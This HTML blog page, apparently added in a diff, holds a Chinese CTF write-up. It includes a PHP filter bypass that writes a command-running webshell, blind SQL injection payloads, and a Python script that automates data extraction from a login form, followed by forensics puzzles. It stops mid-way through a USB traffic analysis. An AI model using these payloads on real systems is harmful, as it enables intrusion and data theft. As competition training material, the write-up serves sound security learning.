@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang=zh-TW>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Webwrite_shell題目給出如下程式碼。 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&amp;#123;    if(preg_match(&quot;&#x2F;&amp;#x27;|">
+<meta property="og:type" content="article">
+<meta property="og:title" content="紅明谷杯 CTF 2021">
+<meta property="og:url" content="https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html">
+<meta property="og:site_name" content="Hexagon">
+<meta property="og:description" content="Webwrite_shell題目給出如下程式碼。 123456789101112131415161718192021222324252627282930313233343536&lt;?phperror_reporting(0);highlight_file(__FILE__);function check($input)&amp;#123;    if(preg_match(&quot;&#x2F;&amp;#x27;|">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617358076482.07a4ba821854dd46252e4b024f508e5dc420bddc.png@300w.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474546488.deeae47218a5332e33a85e2b3204c5a786ddc960.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474654580.0da53e45c986f323c9c5e44f2884f07a0e1d47e5.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474845995.829b70a6cfa12d47999bdddf033a5c72622023c2.png@300w">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617475381094.5f933f522524ad736a81bfca551f7d633ed70984.png">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617517178191.1bb1a0be2368cc55cdfd76143e4bd788551d026a.jpg@200w_200h_1c">
+<meta property="og:image" content="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617516627746.2bb321fbe2bf4f220f0e679d964eee3f8d96eb71.png">
+<meta property="article:published_time" content="2021-04-04T05:35:00.000Z">
+<meta property="article:modified_time" content="2021-04-28T08:29:48.020Z">
+<meta property="article:author" content="LemonPrefect">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617358076482.07a4ba821854dd46252e4b024f508e5dc420bddc.png@300w.png">
+    
+    
+      
+        
+          
+            <link rel="shortcut icon" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=48">
+          
+        
+      
+      
+        
+          
+            <link rel="icon" type="image/png" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=192">
+          
+        
+      
+      
+        
+          
+            <link rel="apple-touch-icon" size="180x180" href="https://cdn.v2ex.com/gravatar/eed1611c13fd0710bb8b3bbf8ac44cc7?s=180">
+          
+        
+      
+    
+    <!-- title -->
+    <title>紅明谷杯 CTF 2021</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="Hexagon" type="application/atom+xml">
+<link rel="alternate" href="/rss2.xml" title="Hexagon" type="application/rss+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/zh-TW/">首頁</a></li>
+         
+          <li><a href="/zh-TW/archives/">文章</a></li>
+         
+          <li><a href="/writeups/">WriteUps</a></li>
+         
+          <li><a href="/tools/">工具</a></li>
+         
+          <li><a href="/about/">關於</a></li>
+         
+          <li><a href="/search/">搜尋</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        <!-- 
+        <li><a class="icon" aria-label="上一篇 " href="/zh-TW/posts/9a222575.html"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/zh-CN/posts/827bc0ca.html"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        --!>
+
+        
+          
+          
+          
+            <li><a class="icon" aria-label="中文简体（大陆标准） " href="/zh-CN/posts/f33b0bb3.html">简</a></li>
+          
+            <li><a class="icon" aria-label="正体中文（台灣標準） " href="#">正</a></li>
+          
+        
+
+        <li><a class="icon" aria-label="回到頁首 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true"></i></a></li>
+        <li><a class="icon" aria-label="分享 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">回到頁首</span>
+      <span id="i-share" class="info" style="display:none;">分享</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&text=紅明谷杯 CTF 2021"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&title=紅明谷杯 CTF 2021"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&is_video=false&description=紅明谷杯 CTF 2021"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=紅明谷杯 CTF 2021&body=Check out this article: https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&title=紅明谷杯 CTF 2021"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&title=紅明谷杯 CTF 2021"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&title=紅明谷杯 CTF 2021"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&title=紅明谷杯 CTF 2021"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&name=紅明谷杯 CTF 2021&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lemonprefect.cn/zh-TW/posts/f33b0bb3.html&t=紅明谷杯 CTF 2021"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#write-shell"><span class="toc-number">1.1.</span> <span class="toc-text">write_shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#happysql"><span class="toc-number">1.2.</span> <span class="toc-text">happysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eztp"><span class="toc-number">1.3.</span> <span class="toc-text">eztp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">2.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B0%BD%E5%88%B0"><span class="toc-number">2.1.</span> <span class="toc-text">簽到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#InputMonitor"><span class="toc-number">2.2.</span> <span class="toc-text">InputMonitor</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E5%BF%83%E6%98%AF%E5%86%B0%E5%86%B0%E7%9A%84"><span class="toc-number">2.3.</span> <span class="toc-text">我的心是冰冰的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AD%AA%E6%AF%94%E6%AD%AA%E6%AF%94"><span class="toc-number">2.4.</span> <span class="toc-text">歪比歪比</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        紅明谷杯 CTF 2021
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">LemonPrefect</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-04-04T05:35:00.000Z" itemprop="datePublished">2021-04-04</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="write-shell"><a href="#write-shell" class="headerlink" title="write_shell"></a>write_shell</h3><p>題目給出如下程式碼。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="variable">$input</span>))&#123;</span><br><span class="line">        <span class="comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;hacker!!!&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$input</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$input</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(is_array(<span class="variable">$input</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$input</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$output</span>)&#123;</span><br><span class="line">          <span class="variable">$input</span>[<span class="variable">$key</span>] = waf(<span class="variable">$output</span>);</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$input</span> = check(<span class="variable">$input</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dir</span> = <span class="string">&#x27;sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$dir</span>))&#123;</span><br><span class="line">    mkdir(<span class="variable">$dir</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">switch</span>(<span class="variable">$_GET</span>[<span class="string">&quot;action&quot;</span>] ?? <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;pwd&#x27;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$dir</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&#x27;upload&#x27;</span>:</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>] ?? <span class="string">&quot;&quot;</span>;</span><br><span class="line">        waf(<span class="variable">$data</span>);</span><br><span class="line">        file_put_contents(<span class="string">&quot;<span class="subst">$dir</span>&quot;</span> . <span class="string">&quot;index.php&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用 <code>?action=pwd</code> 得到當前沙盒路徑 <code>sandbox/4e5b09b2149f7619cca155c8bd6d8ee5/</code>。使用 <code>&lt;?=</code> 標籤構造出 payload <code>?action=upload&data=&lt;?=&grave;ls%09/&grave;?></code> 之後再訪問沙箱路徑可得如下內容。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!whatyouwantggggggg401.php bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
+
+<p>構造出 <code>?action=upload&data=&lt;?=&grave;nl%09/!whatyouwantggggggg401.*&grave;?></code> 後再訪問沙箱路徑檢視頁面原始碼可以發現如下內容，從而可以得到 flag。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>	<span class="meta">&lt;?php</span> <span class="variable">$flag</span> = <span class="string">&#x27;flag&#123;85d95bb1-3831-4529-8bfa-cc7336c57b27&#125;&#x27;</span>;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;85d95bb1-3831-4529-8bfa-cc7336c57b27&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="happysql"><a href="#happysql" class="headerlink" title="happysql"></a>happysql</h3><p>隨手註冊一個賬號登入上去可以發現並沒有業務介面，結合題目猜測是 SQL 注入，且注入點在登入或者註冊的頁面。因此構造出如下 payload 驗證得到一個布林邏輯。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;null&quot;&#x2F;**&#x2F;||&#x2F;**&#x2F;1&#x2F;**&#x2F;In&#x2F;**&#x2F;(1)#</span><br><span class="line">&amp;password&#x3D;122</span><br></pre></td></tr></table></figure>
+
+<p>於是嘗試讀取出資料庫名，此時可以發現很多字元被 ban 了。這裡記錄一下部分遇到的字元。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or,and,&#x3D;,&gt;,&lt;,substr,if,[空格],+,-</span><br></pre></td></tr></table></figure>
+
+<p>此時可以採用 <code>In (1,2,3...)</code> 的方式來二分盲注，使用 <code>case when ... then ... else ... end</code> 的語法來做邏輯判斷。需要注意的是 <code>in</code> 並不是匹配一個區間而是需要窮舉，譬如 <code>select (2 in (1,3))</code> 返回的將會是 0，應為此時的 2 既不是 1 也不是 3。因為 <code>substr</code> 被禁用，因此採用 <code>left(reverse(left(&#123;sql&#125;,n)),1)</code> 的辦法來讀到每一位。此時構造出如下兩個 payload 即可驗證可行性。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;null&quot;&#x2F;**&#x2F;||&#x2F;**&#x2F;(case&#x2F;**&#x2F;when(ascii(left(reverse(left((select&#x2F;**&#x2F;database()),1)),1)))&#x2F;**&#x2F;in&#x2F;**&#x2F;(99)then(cot(0))else(1)end)#</span><br><span class="line">&amp;password&#x3D;122</span><br><span class="line">username&#x3D;null&quot;&#x2F;**&#x2F;||&#x2F;**&#x2F;(case&#x2F;**&#x2F;when(ascii(left(reverse(left((select&#x2F;**&#x2F;database()),1)),1)))&#x2F;**&#x2F;in&#x2F;**&#x2F;(0)then(cot(0))else(1)end)#</span><br><span class="line">&amp;password&#x3D;122</span><br></pre></td></tr></table></figure>
+
+<p>寫個指令碼用二分法查出表名。因為 <code>or</code> 被禁用導致沒有 <code>information_schema</code> 可用，此時可以採用 <code>mysql.innodb_table_stats</code> 代替其查出表名。因為無法查出列名，因此採用無列名注入。寫個指令碼跑出 flag。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlencode</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;.../login.php&quot;</span></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    text = <span class="string">&quot;&quot;</span></span><br><span class="line">    keywords = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">126</span></span><br><span class="line">        <span class="keyword">while</span> low &lt;= high:</span><br><span class="line">            mid = <span class="built_in">int</span>((low + high) / <span class="number">2</span>)</span><br><span class="line">            <span class="comment"># sqlContent = &quot;select/**/database()&quot;.replace(&quot; &quot;, &quot;/**/&quot;)  #ctf</span></span><br><span class="line">            <span class="comment"># sqlContent = &quot;select group_concat(table_name) from mysql.innodb_table_stats&quot;.replace(&quot; &quot;, &quot;/**/&quot;)  #ctf,f1ag,gtid_slave_pos</span></span><br><span class="line">            sqlContent = <span class="string">&quot;select group_concat(b) from (select 1 as b union select * from f1ag)a&quot;</span>.replace(<span class="string">&quot; &quot;</span>, <span class="string">&quot;/**/&quot;</span>)  <span class="comment">#1,flag&#123;972f6491-7e54-47b1-ada0-639991ecd284&#125;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: <span class="string">&quot;null&quot;</span>,</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">f&quot;nullnull\&quot;/**/||/**/(case/**/when(ascii(left(reverse(left((<span class="subst">&#123;sqlContent&#125;</span>),<span class="subst">&#123;i&#125;</span>)),1)))/**/in/**/(<span class="subst">&#123;<span class="built_in">str</span>(<span class="built_in">list</span>(<span class="built_in">range</span>(low, mid + <span class="number">1</span>))).replace(<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27; &#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)&#125;</span>)then(cot(0))else(1)end)#&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            r = session.post(url=url, data=param)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Username&quot;</span> <span class="keyword">in</span> r.content:</span><br><span class="line">                high = mid - <span class="number">1</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        mid_num = <span class="built_in">int</span>((high + low + <span class="number">1</span>) / <span class="number">2</span>)</span><br><span class="line">        text += <span class="built_in">chr</span>(mid_num)</span><br><span class="line">        <span class="built_in">print</span>(text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;972f6491-7e54-47b1-ada0-639991ecd284&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="eztp"><a href="#eztp" class="headerlink" title="eztp"></a>eztp</h3><blockquote>
+<p>ThinkPHP v3.2.* （SQL注入&amp;檔案讀取）反序列化POP鏈：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA">https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA</a></p>
+</blockquote>
+<p><code>.../www.zip</code> 讀到原始碼洩露。</p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="簽到"><a href="#簽到" class="headerlink" title="簽到"></a>簽到</h3><p>有手就行的答題。</p>
+<blockquote>
+<p>參考：<a target="_blank" rel="noopener" href="https://www.cnitpm.com/pm/32463.html">https://www.cnitpm.com/pm/32463.html</a></p>
+</blockquote>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617358076482.07a4ba821854dd46252e4b024f508e5dc420bddc.png@300w.png"></p>
+<p>在資料庫系統中，口令保護是資訊系統的第一道屏障。</p>
+<p>為了防止物理上取走資料庫而採取的加強資料庫安全的方法是資料庫加密。</p>
+<p>系統要達到什麼樣的完整性，取決於系統所處理資訊地重要程度、價值和敏感性。</p>
+<p>在資料庫的安全評估過程中，可行性是指系統能夠對付各種可能地攻擊的能力。</p>
+<p>資料庫訪問控制策略中，只需策略是隻讓使用者得到有相應許可權的資訊，這些資訊恰到可以讓使用者完成自己的工作，其他的權利一律不給。</p>
+<p>資料庫的安全策略是指如何組織、管理、保護和處理敏感資訊的指導思想。它包括安全管理策略、訪問控制策略和資訊控制策略。</p>
+<p>資料庫的加密方法中，採用庫外加密，則金鑰管理較為簡單，只需借用檔案加密的金鑰管理方法。</p>
+<p>在下面的加密方法中，元素加密加解密的效率最低。</p>
+<p>事故故障是指事務在執行至正常終止前被中止，這時恢復子系統應利用日誌檔案撤銷此事物已對資料庫進行的修改。</p>
+<p>發生介質故障後，磁碟上的物理資料和日誌檔案被破壞，這是最嚴重的一種故障，恢復方法是重灌資料庫，然後重做已完成的事務。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;4df9488a-b979-4151-9f15-baa772faab3f&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="InputMonitor"><a href="#InputMonitor" class="headerlink" title="InputMonitor"></a>InputMonitor</h3><blockquote>
+<p>Akira在某次取證的過程中，在桌面找到了一個奇怪的檔案，但是除此之外好像沒有找到什麼有價值的情報，很多的資料都被抹乾淨了，而且這個使用者似乎根本就沒裝什麼第三方的軟體。Akira還粗心的只複製了C盤下的User目錄，這下還有機會解開可疑檔案嗎？</p>
+</blockquote>
+<p>檢視附件中使用者 link3 的桌面檔案可以發現如下提示。</p>
+<figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">沒事，我都刪掉了，之前的聊天記錄都被我清乾淨了。除非他們在監控我輸入</span><br></pre></td></tr></table></figure>
+
+<p>此時得知需要分析微軟輸入法的學習詞庫，並且可以得到 flag.7z。定向到 <code>%appdata%\Microsoft\InputMethod\Chs</code> 可得 ChsPinyinIH.dat 和 ChsPinyinUDL.dat。使用詞庫轉換檔案提取 UDL 檔案中的內容可得提示。</p>
+<blockquote>
+<p>studyzy/imewlconverter: <a target="_blank" rel="noopener" href="https://github.com/studyzy/imewlconverter">https://github.com/studyzy/imewlconverter</a></p>
+</blockquote>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474546488.deeae47218a5332e33a85e2b3204c5a786ddc960.png"></p>
+<p>此時可知密碼是六個字。再將 IH 檔案中的內容使用 UTF-16LE 的格式解碼。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474654580.0da53e45c986f323c9c5e44f2884f07a0e1d47e5.png" alt="image-20210404023052648"></p>
+<p>此時得到壓縮包的密碼 <code>有志者事竟成</code>。解壓壓縮包後得到 hidden.pdf 檔案。將 PDF 檔案使用 Acrobat DC 開啟後將圖片移開即可得 flag。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617474845995.829b70a6cfa12d47999bdddf033a5c72622023c2.png@300w"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Y0u_F1nd_h1dd3n_m3g&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="我的心是冰冰的"><a href="#我的心是冰冰的" class="headerlink" title="我的心是冰冰的"></a>我的心是冰冰的</h3><p>附件直接解壓會提示檔案頭錯誤，因此直接採用 CyberChef 來提取檔案。<code>Extract Files</code> 可以發現有如下圖片，將圖片和壓縮文件下載下來。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617475381094.5f933f522524ad736a81bfca551f7d633ed70984.png"></p>
+<p>對提取出的圖片使用 Java 盲水印工具提取水印 <code>javaw -jar .\BlindWatermark-v0.0.3-windows-x86_64.jar decode -c &#39;.\extracted_at_0x51.jpg&#39; &#39;.\extracted_at_0x51_d.jpg&#39;</code> 可得如下圖片。</p>
+<p><img src="https://butter.lumosary.workers.dev/images/archive/a850ee59-1552-4e96-92a3-c88074a54003/1617517178191.1bb1a0be2368cc55cdfd76143e4bd788551d026a.jpg@200w_200h_1c"></p>
+<p>可知壓縮包密碼為 <code>gnibgnib</code>。解壓壓縮檔案後得到流量包。使用 WireShark 很容易看出是 USB 流量。同時可以發現裝置的製造廠商是 <code>Holtek Semiconductor, Inc.</code>。先使用 tshark 將裝置的 Leftover Capture Data 給提取出來 <code>tshark.exe -r bingbing.pcapng -T fields -e usb.capdata &gt; usbdata.txt</code>，可以得到如下內容。</p>
